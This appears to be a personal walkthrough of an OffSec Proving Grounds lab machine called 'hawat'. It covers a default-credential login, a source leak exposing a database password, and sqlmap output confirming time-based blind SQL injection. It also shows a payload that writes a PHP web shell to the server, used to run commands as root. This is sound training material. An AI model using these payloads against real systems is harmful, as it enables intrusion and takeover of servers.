![[Pasted image 20250113213512.png]]
#### contact page
![[Pasted image 20250113220108.png]]
upon submission
![[Pasted image 20250113220134.png]]
testing for `XSS` with `<h1>offsec</h1>`
![[Pasted image 20250113220336.png]]
illegal
![[Pasted image 20250113220348.png]]changed the placeholders all to `text variables` to try the same payload and no luck
![[Pasted image 20250113220638.png]]

#### /cloud
starting page
![[Pasted image 20250113234217.png]]
able to login as `admin:admin` - always try default credentials
- default page of `admin:admin` has a `issuetracker.zip`
![[Pasted image 20250113234241.png]]
download the `issuetracker.zip`
![[Pasted image 20250113234356.png]]downloaded
![[Pasted image 20250113234514.png]]
after `unzipping` and navigating to this path we find something interesting
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[14Jan2025 04:49:10]-[/home/â€¦/com/issue/tracker/issues]
â””â”€# pwd          
/home/kali/SUT/OSWA/proving_grounds/hawat/issuetracker/src/main/java/com/issue/tracker/issues
```
`IssueController.java`
![[Pasted image 20250113235258.png]]
we see that there is an `SQL Login` of `issue_user:ManagementInsideOld797` and a potential `SQL Injection` at `priority`
![[Pasted image 20250113235431.png]]
we notice that the `Issue Tracker` is at `17445`
- WE ALSO GET A NEW ENDPOINT AT `/ISSUE/checkByPriority`
![[Pasted image 20250113235540.png]]
if navigating to this endpoint we get a `405` error
![[Pasted image 20250114000019.png]]
but when looking in `BURPSUITE` we can see that only `POST` requests are allowed
![[Pasted image 20250114000108.png]]sending to repeater and changing to `POST` to test
![[Pasted image 20250114000141.png]]
once changed and sent we still get a `400` error
![[Pasted image 20250114000227.png]]
now that we have a `POST` request we are going to `SQLMAP` - this doesn't work, we have to use the `SOURCECODE` from earlier and add the `priority=` parameter

```http
POST /issue/checkByPriority?priority=testing HTTP/1.1                                                                                                                                   
Host: hawat:17445
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=0801DB6032AD6C72FA2F0EC488F44DDE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
`SQLmap` command
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[14Jan2025 05:16:16]-[/home/â€¦/SUT/OSWA/proving_grounds/hawat]
â””â”€# sqlmap -r 17445_issue_checkByPriority_POST.txt --batch --risk=1 --level=3 --flush-session
[05:14:34] [INFO] GET parameter 'priority' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] Y
[05:14:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:14:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:14:44] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[05:14:55] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[05:15:04] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[05:15:13] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[05:15:23] [INFO] checking if the injection point on GET parameter 'priority' is a false positive
GET parameter 'priority' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 884 HTTP(s) requests:
---
Parameter: priority (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: priority=testing' AND (SELECT 2200 FROM (SELECT(SLEEP(5)))OboM)-- HvDP
---

```
vulnerable to `time-based blind`
![[Pasted image 20250114001719.png]]
`SQLmap` is failing to get a shell with `--os-shell` going to have to do it manually
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[14Jan2025 05:21:16]-[/home/â€¦/SUT/OSWA/proving_grounds/hawat]
â””â”€# sqlmap -r 17445_issue_checkByPriority_POST.txt --os-shell
```
![[Pasted image 20250114002241.png]]
starting manually - starting payload
```bash
' AND (SELECT 2200 FROM (SELECT(SLEEP(5)))OboM)-- HvDP
```
in order to get this payload to work, have to `URL-ENCODE` with `CTRL+U`
![[Pasted image 20250114002516.png]]
was able to get a `web shell` with this payload
```sql
' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
```
but i had to `URL ENCODE` it with `DECODER`
![[Pasted image 20250114005033.png]]once `ENCODED`, through it in and got a 200 error
![[Pasted image 20250114005102.png]]
navigated to `http://hawat:30455/shell.php?cmd=whoami` and was root
![[Pasted image 20250114005120.png]]
now to get a reverse shell from web shell

`PWD`
![[Pasted image 20250114005156.png]]
`proof.txt`
3cc54d8953b405f767295eecdd0177a9
![[Pasted image 20250114005348.png]]